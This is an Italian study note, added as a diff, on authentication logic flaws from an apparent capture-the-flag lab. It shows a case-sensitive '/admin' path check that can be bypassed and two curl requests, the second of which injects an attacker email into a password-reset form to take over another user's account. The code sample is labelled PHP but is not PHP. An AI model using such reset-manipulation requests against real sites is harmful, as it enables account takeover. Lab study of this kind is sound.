@@ -1,0 +1,42 @@
+A volte i processi di autenticazione possono contenere dei difetti logici, ossia quando il percorso ditipo di un'applicazione è bypassato o manipolato da un hacker. Questi errori logici si possono trovare in diverse aree di un sito web. Qui vedo quelli legati all'AUTENTICAZIONE.
+
+				 Hacker: Step1>Step4
+			Percorso inteso: Step1>Step2>Step3>Step4
+
+===================================================================================================
+
+	CODICE PHP, ESEMPIO
+
+if( url.substr(0,6) === '/admin') {
+    # Code to check user is an admin
+} else {
+    # View Page
+}
+
+===================================================================================================
+
+Nell'esempio, === cerca per un match esatto nella stringa
+			'/admin' 
+			(compreso anche il casing delle lettere)
+Quindi c'è un problema.
+Un utente potrebbe digitare /adMin ed accedere alla pagina anche se non è un admin come si intendeva fare, bypassando i controlli admin.
+
+===================================================================================================
+
+	RECUPERO PASSWORD
+
+Nel recupero di una password, in un sito inseriamo l'indirizzo mail che viene inviato in una stringa di richiesta query GET, e poi l'username come POST al server web.
+
+Ecco cosa succede se proviamo a fare manualmente la richiesta al server web: 
+
+curl 'http://10.10.190.202/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
+
+invierà una richiesta di ticket
+
+se creo un mio account 
+
+curl 'http://10.10.190.202/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
+
+questo invierà un ticket che mi farà accedere automaticamente all'account di robert
+
+
